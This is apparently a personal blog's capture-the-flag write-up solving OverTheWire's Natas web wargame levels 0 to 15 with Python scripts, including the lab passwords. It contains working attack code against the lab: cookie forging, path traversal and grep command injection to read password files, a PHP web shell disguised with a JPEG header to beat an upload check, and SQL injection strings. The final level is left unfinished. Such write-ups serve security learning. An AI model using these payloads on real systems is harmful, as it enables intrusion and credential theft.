@@ -1,0 +1,964 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Natas (OverTheWire)</title>
+<meta name="generator" content="Org mode" />
+<link rel='stylesheet' href='/css/default.css' />
+<link rel='stylesheet' href='/css/source-code.css' />
+</head>
+<body>
+<div id="preamble" class="status">
+<h1 id='site-name'>Bryan Rinders</h1>
+<div id='menu'>
+  <a href='/html/'>Home</a>
+  <a href='/html/ctf/'>CTF WriteUps</a>
+  <a href='/html/emacs/'>Emacs</a>
+  <a href='/html/linux/'>Linux Tutorials</a>
+  <a href='https://gitlab.com/bryos/dotfiles' target='_blank'>Dotfiles</a>
+  <a href='/html/other/'>Other</a>
+  <span class='right'>
+    <a href='/html/sitemap.html'>Sitemap</a>
+  </span>
+</div>
+<br><hr>
+</div>
+<div id="content">
+<h1 class="title">Natas (OverTheWire)</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#org499533d">1. Introduction</a></li>
+<li><a href="#org4627439">2. Level 0</a></li>
+<li><a href="#org03b36f1">3. Level 1</a></li>
+<li><a href="#org953526b">4. Level 2</a></li>
+<li><a href="#orgf1b09c9">5. Level 3</a></li>
+<li><a href="#org9b9850f">6. Level 4</a></li>
+<li><a href="#org61d717d">7. Level 5</a></li>
+<li><a href="#orge6c6734">8. Level 6</a></li>
+<li><a href="#org2bf68de">9. Level 7</a></li>
+<li><a href="#orgde0efbe">10. Level 8</a></li>
+<li><a href="#orgc66ea88">11. Level 9</a></li>
+<li><a href="#org276bdb0">12. Level 10</a></li>
+<li><a href="#org9fbd29b">13. Level 11</a>
+<ul>
+<li><a href="#org8a4c7d4">13.1. Intro</a></li>
+<li><a href="#orgbe05e7d">13.2. Get the cookie (cipher text)</a></li>
+<li><a href="#org70a09a0">13.3. Get the plain text</a></li>
+<li><a href="#org9590e23">13.4. Find the encryption key</a></li>
+<li><a href="#orgb7d7bbf">13.5. Get the password for natas12</a></li>
+</ul>
+</li>
+<li><a href="#org2b78324">14. Natas 12</a></li>
+<li><a href="#orgb13ae10">15. Natas 13</a></li>
+<li><a href="#org83aea71">16. Natas 14</a></li>
+<li><a href="#orgba1a75c">17. Natas 15</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org499533d" class="outline-2">
+<h2 id="org499533d"><span class="section-number-2">1</span> Introduction</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+This is a writeup for the <a href="https://overthewire.org/wargames/">overthewire.org</a> war game Natas. To start a level 
+visit the URL <a href="http://natasx.natas.labs.overthewire.org">http://natasx.natas.labs.overthewire.org</a>, and login with 
+username: natasX and the password found in the previous level, where X is the 
+level number. 
+All passwords for the next level are also stored in
+/etc/natas<sub>webpass</sub>/natasX, where X is the number of the level.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org4627439" class="outline-2">
+<h2 id="org4627439"><span class="section-number-2">2</span> Level 0</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+View the source page and find the password:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">curl -u natas0:natas0 <span class="org-string">"http://natas0.natas.labs.overthewire.org/"</span> | grep natas1
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: &lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org03b36f1" class="outline-2">
+<h2 id="org03b36f1"><span class="section-number-2">3</span> Level 1</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+View the source page by using a short cut key (for me &lt;C-u&gt;, Ctrl+u):
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">curl -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto  <span class="org-string">"http://natas1.natas.labs.overthewire.org/"</span> | grep natas2
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: &lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org953526b" class="outline-2">
+<h2 id="org953526b"><span class="section-number-2">4</span> Level 2</h2>
+<div class="outline-text-2" id="text-4">
+<p>
+Again view the source page. There is a line with a link to an image 
+</p>
+
+<pre class="example">
+&lt;img src="files/pixel.png"&gt;
+</pre>
+
+<p>
+This links to "<img src="http://natas2.natas.labs.overthewire.org/files/pixel.png" alt="pixel.png" />", note 
+the <i>files/pixels.png. Which means it might be possible to explorer the files 
+'files' directory. Exploring "<a href="http://natas2.natas.labs.overthewire.org/files">http://natas2.natas.labs.overthewire.org/files</a></i>" 
+it shows that there it another file called 'users.txt' which contains the 
+password for the next level.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">curl -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi <span class="org-string">"http://natas2.natas.labs.overthewire.org/files/users.txt"</span> | grep natas3
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgf1b09c9" class="outline-2">
+<h2 id="orgf1b09c9"><span class="section-number-2">5</span> Level 3</h2>
+<div class="outline-text-2" id="text-5">
+<p>
+View the source and find the line
+</p>
+
+<pre class="example">
+&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;
+</pre>
+
+<p>
+which hints at the 'robots.txt' file that contains the directories webcrawlers are not supossed to visit. From the 'robots.txt' we get the directory '<i>s3cr3t</i>' which contains the 'users.txt' file with the password for natas4.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 <span class="org-string">"http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"</span> | grep natas4
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org9b9850f" class="outline-2">
+<h2 id="org9b9850f"><span class="section-number-2">6</span> Level 4</h2>
+<div class="outline-text-2" id="text-6">
+<p>
+To get access to the password we need to come from the natas5 website as is 
+metioned on the website when first loging in. 
+</p>
+<pre class="example">
+Access disallowed. You are visiting from "" while authorized users should come 
+only from "http://natas5.natas.labs.overthewire.org/"
+</pre>
+<p>
+It is possible to simulate this by setting the referer in the header of the get
+request to the natas5 website.
+</p>
+
+<p>
+First define a function that can find the password in the raw html text:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="org053659f">def find_pswd(text):
+    # find the line with the password in the html text
+    lines = text.split('\n')
+    bools = list(map(lambda x : "password" in x, lines))
+    for (b,line) in zip(bools,lines):
+	if b:
+	    return line
+</pre>
+</div>
+
+<p>
+Now the code that change the referer to natas5:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="orgd03dd7b"># The code is written in python
+import requests
+from requests.auth import HTTPBasicAuth
+
+user = "natas4"
+pswd = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
+url = "http://natas4.natas.labs.overthewire.org/"
+headers = {'referer': 'http://natas5.natas.labs.overthewire.org/'}
+
+# get request with the referer set to natas5
+r = requests.get(url, headers=headers, auth=HTTPBasicAuth(user,pswd))
+
+print(find_pswd(r.text))
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org61d717d" class="outline-2">
+<h2 id="org61d717d"><span class="section-number-2">7</span> Level 5</h2>
+<div class="outline-text-2" id="text-7">
+<p>
+After logging in the web page shows:
+</p>
+
+<pre class="example">
+Access disallowed. You are not logged in
+</pre>
+
+<p>
+Lets inspect the headers to see what is happening
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="orgdce51e1"># The code is written in python
+import requests
+from requests.auth import HTTPBasicAuth
+
+user = "natas5"
+pswd = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
+url = "http://natas5.natas.labs.overthewire.org/"
+
+r = requests.get(url, auth=HTTPBasicAuth(user,pswd))
+print(r.headers)
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: {'Date': 'Sat, 05 Mar 2022 10:28:27 GMT', 'Server': 'Apache/2.4.10 (Debian)', 'Set-Cookie': 'loggedin=0', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '367', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
+</pre>
+
+<p>
+The output show that the the Set-cookie loggedin=0, if that is changed to 
+loggedin=1 then that should give access to the password.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="org15f8e01">cookies = {'loggedin': '1'}
+
+# get request with the cookie set loggedin=1
+r = requests.get(url, cookies=cookies, auth=HTTPBasicAuth(user,pswd))
+
+# find the line with the password in it
+print(find_pswd(r.text))
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1&lt;/div&gt;
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orge6c6734" class="outline-2">
+<h2 id="orge6c6734"><span class="section-number-2">8</span> Level 6</h2>
+<div class="outline-text-2" id="text-8">
+<p>
+After logging in we are prompted to input a secret. The source contains the line:
+</p>
+<pre class="example">
+&lt;div id="viewsource"&gt;&lt;a href="index-source.html"&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
+</pre>
+<p>
+Then going to the url view-source:<a href="http://natas6.natas.labs.overthewire.org/index-source.html">http://natas6.natas.labs.overthewire.org/index-source.html</a> contains:
+</p>
+<pre class="example">
+include "includes/secret.inc";
+</pre>
+<p>
+follow this to the url <a href="http://natas6.natas.labs.overthewire.org/includes/secret.inc">http://natas6.natas.labs.overthewire.org/includes/secret.inc</a>, which reveals the secret: "FOEIUWGHFEEUHOFUOIU"
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="org8e0513a">user = "natas6"
+pswd = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
+url = "http://natas6.natas.labs.overthewire.org/"
+post_data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "submit"}
+
+# get request with the referer set to natas5
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=post_data)
+
+print(find_pswd(r.text))
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org2bf68de" class="outline-2">
+<h2 id="org2bf68de"><span class="section-number-2">9</span> Level 7</h2>
+<div class="outline-text-2" id="text-9">
+<p>
+The source page says:
+</p>
+<pre class="example">
+&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;
+</pre>
+
+<p>
+and there are two links for 'Home' and 'About', 'index.php?page=Home' and 'index.php?page=About respectively. Changing either 'Home' or 'About' with the path to the password file will give access to the password, i.e. <code>/index.php?page=/etc/natas_webpass/natas8</code>.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="org28621bb">user = "natas7"
+pswd = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
+url = "http://natas7.natas.labs.overthewire.org/"
+location = "/index.php?page=/etc/natas_webpass/natas8"
+
+# get request with the referer set to natas5
+r = requests.post(url+location, auth=HTTPBasicAuth(user,pswd))
+
+print(r.text.split('\n')[-7])
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgde0efbe" class="outline-2">
+<h2 id="orgde0efbe"><span class="section-number-2">10</span> Level 8</h2>
+<div class="outline-text-2" id="text-10">
+<p>
+The source page again has a link to:
+</p>
+<pre class="example">
+index-source.html
+</pre>
+<p>
+which reveals an encoded secret:
+</p>
+<pre class="example">
+3d3d516343746d4d6d6c315669563362
+</pre>
+<p>
+it is encoded with this function:
+</p>
+<pre class="example">
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+</pre>
+<p>
+All we need to do is reverse this function on the given encoded secret:
+</p>
+<div class="org-src-container">
+<pre class="src src-ein-python" id="org154b4c4">import base64
+
+secret = "3d3d516343746d4d6d6c315669563362"
+# convert hex to binary
+binary_secret = bin(int(secret, 16))
+# convert the bits to a string of chars
+char_secret = ''.join(chr(int(binary_secret[i*8:i*8+8],2)) for i in range(len(binary_secret)//8))
+# reverse the string
+reverse_secret  = char_secret[::-1]
+# base64 decode the string
+#decoded_secret = base64.b64decode(reverse_secret.encode("ascii")).decode("ascii")
+decoded_secret = base64.b64decode(reverse_secret).decode("ascii")
+print("The decoded secret is: " + decoded_secret)
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: The decoded secret is: oubWYf2kBq
+</pre>
+
+<p>
+Now we can POST the secret to get the password.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="orgd3287b1">user = "natas8"
+pswd = "DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe"
+url = "http://natas8.natas.labs.overthewire.org/"
+post_data = {"secret": "oubWYf2kBq", "submit": "submit"}
+
+# get request with the referer set to natas5
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=post_data)
+
+print(find_pswd(r.text))
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgc66ea88" class="outline-2">
+<h2 id="orgc66ea88"><span class="section-number-2">11</span> Level 9</h2>
+<div class="outline-text-2" id="text-11">
+<p>
+On the site there is a search box that searches for words. Trying out some words in the search box shows that it actual does find all words containing the searched string. Inspecting the source reveals this piece of code:
+</p>
+
+<pre class="example">
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+</pre>
+
+<p>
+So it is using grep to find results from 'dictionary.txt', but grep allows for multiple input files to search in and so if we input an extra file into the search box then it will search that file as well as 'dictionary.txt'. The file we want to include in the submit box is 'etc/natas<sub>webpass</sub>/natas10', the file that holds the password for the next level.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="org96ea12c">import re
+
+user = "natas9"
+pswd = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"
+url = "http://natas9.natas.labs.overthewire.org/"
+post_data = {"needle": "'' /etc/natas_webpass/natas10", "submit": "submit"}
+
+# get request with the referer set to natas5
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=post_data)
+
+print(re.findall('/etc/natas_webpass/natas10:(.*)', r.text)[0])
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org276bdb0" class="outline-2">
+<h2 id="org276bdb0"><span class="section-number-2">12</span> Level 10</h2>
+<div class="outline-text-2" id="text-12">
+<p>
+This level is similar to the previous level but it checks if there are "illegal" characters in the input.
+</p>
+
+<pre class="example">
+if($key != "") {
+    if(preg_match('/[;|&amp;]/',$key)) {
+	print "Input contains an illegal character!";
+    } else {
+	passthru("grep -i $key dictionary.txt");
+    }
+}
+</pre>
+
+<p>
+From the regular expression in 'preg<sub>match</sub>' the illegal characters are ';' and '&amp;'. Since those characters weren't used in the previous level it is possible to re-use the 'needle' from level 9.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="orgcc90b57">user = "natas10"
+pswd = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
+url = "http://natas10.natas.labs.overthewire.org/"
+post_data = {"needle": "'' /etc/natas_webpass/natas11", "submit": "submit"}
+
+# get request with the referer set to natas5
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=post_data)
+
+print(re.findall('/etc/natas_webpass/natas11:(.*)', r.text)[0])
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org9fbd29b" class="outline-2">
+<h2 id="org9fbd29b"><span class="section-number-2">13</span> Level 11</h2>
+<div class="outline-text-2" id="text-13">
+</div>
+<div id="outline-container-org8a4c7d4" class="outline-3">
+<h3 id="org8a4c7d4"><span class="section-number-3">13.1</span> Intro</h3>
+<div class="outline-text-3" id="text-13-1">
+<p>
+From the source code, these are the most important functions/variables:
+</p>
+
+<pre class="example">
+$defaultdata = array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff");
+
+function xor_encrypt($in) {
+    $key = '&lt;censored&gt;';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i&lt;strlen($text);$i++) {
+	$outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+
+</pre>
+
+<p>
+The <code>xor_encrypt()</code> function simply encrypts the input with a censored key. And the <code>saveData()</code> creates a cookie from the <code>$defaultdata</code>. The first thing to do is get a cookie. With this cookie and the <code>defaultdata</code> it is possible to exploit a property of the xor function, namely: <code>plaintext ^ key = ciphertext</code> can be rewritten to solve for the key like <code>plaintext ^ ciphertext = key</code>. Hence we can find the key with <code>plaintext = $defaultdata</code> and <code>ciphertext = cookie</code>.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgbe05e7d" class="outline-3">
+<h3 id="orgbe05e7d"><span class="section-number-3">13.2</span> Get the cookie (cipher text)</h3>
+<div class="outline-text-3" id="text-13-2">
+<p>
+So lets get a cookie:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="orgad3817a">import requests
+from requests.auth import HTTPBasicAuth
+import re
+
+user = "natas11"
+pswd = "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"
+url = "http://natas11.natas.labs.overthewire.org/"
+data = {"bgcolor": "#000000", "submit": "Set color"}
+
+# get request with the referer set to natas5
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=data)
+
+cookie = r.headers['Set-Cookie'][5:]
+print(r.headers)
+print(f'The cookie is: {cookie}')
+#print(re.findall('/etc/natas_webpass/natas11:(.*)', r.text)[0])
+</pre>
+</div>
+
+<p>
+Results:
+</p>
+<pre class="example">
+: The cookie is: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw%3D
+</pre>
+
+<p>
+This cookie is url encode as can be seen by the %3D at the end. Lets decode it:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="orgc9330d4">from urllib.parse import unquote
+import base64 
+
+cookie = unquote(cookie)
+print(f'The url decoded cookie is: {cookie}')
+cookie = b64decode(cookie).hex()
+print(f'The cookie/cipher text in hex is: {cookie}')
+
+</pre>
+</div>
+
+<p>
+Results:
+</p>
+<pre class="example">
+: The url decoded cookie is: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw=
+: The cookie/cipher text in hex is: 0a554b221e00482b02044f2503131a70531957685d555a2d12185425035502685247087a414708680c
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org70a09a0" class="outline-3">
+<h3 id="org70a09a0"><span class="section-number-3">13.3</span> Get the plain text</h3>
+<div class="outline-text-3" id="text-13-3">
+<p>
+Now to get the plaintext that is used in the <code>xor_encrypt()</code> the <code>savedata()</code> json<sub>encode</sub> the <code>defaultdata</code> first. 
+</p>
+
+<pre class="example">
+// this is php code:
+$defaultdata = array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff");
+json_encode($defaultdata);
+echo (json_encode($defaultdata));
+
+</pre>
+
+<p>
+Result:
+</p>
+<pre class="example">
+{"showpassword":"no","bgcolor":"#ffffff"}
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org9590e23" class="outline-3">
+<h3 id="org9590e23"><span class="section-number-3">13.4</span> Find the encryption key</h3>
+<div class="outline-text-3" id="text-13-4">
+<p>
+Now use the plain and cipher text in a slightly rewritten <code>xor_encrypt()</code> to find the key.
+</p>
+
+<pre class="example">
+// this is php code:
+$defaultdata = array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff");
+
+function xor_encrypt($in, $key) {
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i&lt;strlen($text);$i++) {
+	$outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$plain = json_encode($defaultdata);
+$cipher = hex2bin('0a554b221e00482b02044f2503131a70531957685d555a2d12185425035502685247087a414708680c');
+
+echo ('The key is: ' . xor_encrypt($plain, $cipher));
+
+</pre>
+
+<p>
+Result:
+</p>
+<pre class="example">
+The key is: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq!n'!nJq
+</pre>
+
+<p>
+The is a pattern in the key which means that the key that was used is the substring <code>qw8J</code>.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgb7d7bbf" class="outline-3">
+<h3 id="orgb7d7bbf"><span class="section-number-3">13.5</span> Get the password for natas12</h3>
+<div class="outline-text-3" id="text-13-5">
+<p>
+To get the password change the <code>showpassword</code> value from the array <code>$defaultdata</code> to "yes". Then encrypt the array with the key <code>qw8J</code>. This will result in the value that should be send as the cookie and will give the password.
+</p>
+
+<pre class="example">
+// this is php code:
+$defaultdata = array( "showpassword"=&gt;"yes", "bgcolor"=&gt;"#ffffff");
+
+function xor_encrypt($in, $key) {
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i&lt;strlen($text);$i++) {
+	$outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$plain = json_encode($defaultdata);
+$key = 'qw8J';
+
+echo ('The cipher text is: ' . base64_encode(xor_encrypt($plain, $key)));
+
+</pre>
+
+<p>
+Result:
+</p>
+<pre class="example">
+The cipher text is: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+</pre>
+
+<p>
+Use the just computed cipher text as the cookie and send a get request with the cookie attached. This will show the password for Natas 12.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="orgd0fcc23">import requests
+from requests.auth import HTTPBasicAuth
+import re
+
+user = "natas11"
+pswd = "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"
+url = "http://natas11.natas.labs.overthewire.org/"
+data = {"bgcolor": "#000000", "submit": "Set color"}
+cookies = {'data': 'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'}
+
+# get request with the referer set to natas5
+r = requests.get(url, cookies=cookies, auth=HTTPBasicAuth(user,pswd))
+
+print(re.findall('The password for natas12 is (.*)&lt;br&gt;', r.text)[0])
+
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org2b78324" class="outline-2">
+<h2 id="org2b78324"><span class="section-number-2">14</span> Natas 12</h2>
+<div class="outline-text-2" id="text-14">
+<p>
+The webpage asks for .jpg files to be uploaded. After uploading a picture a link is given to the location, <code>upload/&lt;randomstring&gt;.jpg</code>, of the uploaded file. I tried a few path traversal attacks, e.g. <code>/upload/../etc/natas_webpass/natas13</code>, but all failed. So maybe it is possible to upload some malicious php code instead of a jpg.
+</p>
+
+<p>
+Create a php file called <code>evil.php</code> that contains:
+</p>
+<pre class="example">
+&lt;?php echo (file_get_contents('/etc/natas_webpass/natas13')); ?&gt;
+</pre>
+<p>
+This will print the password for natas13.
+</p>
+
+<p>
+Now the python script that uploads <code>evil.php</code> to the website and gets the randon link to the uploaded file location, which should contain the password for natas13.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="orgda24ba5">import requests
+from requests.auth import HTTPBasicAuth
+import re
+
+user = "natas12"
+pswd = "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"
+url = "http://natas12.natas.labs.overthewire.org/"
+
+evil = {'uploadedfile': open('/home/br/Pictures/shots/evil.php', 'rb')}
+
+# get request with the referer set to natas5
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), files=evil, data={'filename': 'evil.php'})
+
+path = re.findall('href="(upload/.*.php)"&gt;', r.text)[0]
+print('The path to our uploaded file: ' + path + '\n')
+
+r1 = requests.get(url+path, auth=HTTPBasicAuth(user,pswd))
+print('The password for natas13: ' + r1.text)
+
+</pre>
+</div>
+
+<pre class="example">
+: The path to our uploaded file: upload/tdxpbrtuna.php
+: 
+: The password for natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgb13ae10" class="outline-2">
+<h2 id="orgb13ae10"><span class="section-number-2">15</span> Natas 13</h2>
+<div class="outline-text-2" id="text-15">
+<p>
+This level is similar to level 12 but it uses <code>exif_imagetype</code> to check if the file being uploaded is actually an image. It does this by checking the <i>magic number</i> at the beginning of the file. So if we can insert this <i>magic number</i> to the beginning of our php script than it will pass the <code>exif_imagetype</code> check will the server will execute the contents of the file. We will insert the <i>magic number</i> by letting python write it to the file in bytes. The rest of the attack is very similar to level 12. The <i>magic number</i> is <code>\xFF\xD8\xFF\xE0</code>.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="org19851c7">import requests
+from requests.auth import HTTPBasicAuth
+import re
+
+user = "natas13"
+pswd = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
+url = "http://natas13.natas.labs.overthewire.org/"
+
+# write the magic number and the to be executed php to evilFile
+evilFile = '/home/br/Pictures/shots/evil3.php'
+fh = open(evilFile, 'wb')
+fh.write(b'\xFF\xD8\xFF\xE0' + b'&lt;? passthru($_GET["cmd"]); ?&gt;')
+fh.close()
+
+evil = {'uploadedfile': open(evilFile, 'rb')}
+
+# Post the evilFile to the server
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), files=evil, data={'filename': 'evil3.php'})
+
+# print(r.text)
+
+path = re.findall('href="(upload/.*.php)"&gt;', r.text)[0]
+print(f'The path to our uploaded file: {path}\n')
+
+r1 = requests.get(url+path+'?cmd=cat /etc/natas_webpass/natas14', auth=HTTPBasicAuth(user,pswd))
+print(f'The password for natas13: {r1.text[4:]}')
+
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: The path to our uploaded file: upload/ijapb8ongh.php
+: 
+: The password for natas13: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org83aea71" class="outline-2">
+<h2 id="org83aea71"><span class="section-number-2">16</span> Natas 14</h2>
+<div class="outline-text-2" id="text-16">
+<p>
+This level has a login form. The source code reveals the use of very simple sql queries, which means we could try some <a href="https://en.wikipedia.org/wiki/SQL_injection#Incorrectly_constructed_SQL_statements">sql injections</a>. The very first try immediately worked, supplying <code>" or 1=1 --</code> for both the username and the password.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-ein-python" id="orge38c262">import requests
+from requests.auth import HTTPBasicAuth
+import re
+
+user = "natas14"
+pswd = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"
+url = "http://natas14.natas.labs.overthewire.org/"
+data = {'username': '" or 1=1 --', 'password': '" or 1=1 --'}
+
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=data)
+
+# print(r.text)
+
+print(re.findall('password for natas15 is (.*)&lt;br&gt;', r.text)[0])
+
+</pre>
+</div>
+
+<p>
+Result:
+</p>
+<pre class="example">
+: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgba1a75c" class="outline-2">
+<h2 id="orgba1a75c"><span class="section-number-2">17</span> Natas 15</h2>
+<div class="outline-text-2" id="text-17">
+<div class="org-src-container">
+<pre class="src src-ein-python">import requests
+from requests.auth import HTTPBasicAuth
+import re
+
+user = "natas15"
+pswd = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
+url = "http://natas15.natas.labs.overthewire.org/"
+data = {'username': '" or 1=1 --', 'password': '" or 1=1 --'}
+
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=data)
+
+print(r.text)
+
+# print(re.findall('password for natas15 is (.*)&lt;br&gt;', r.text)[0])
+
+</pre>
+</div>
+
+
+<div class="org-src-container">
+<pre class="src src-ein-python">
+
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<br><hr/>
+<footer>
+  <div class='copyright-container'>
+    <div class='copyright'>
+      Copyright &copy; 2022-2023 Bryan Rinders some rights reserved
+      <br><br>
+      This page is available under a
+      <a rel='license' href='http://creativecommons.org/licenses/by/4.0/'>
+        CC-BY 4.0
+      </a> licence.
+    </div>
+  </div>
+  <br>
+  <div class='generated'>
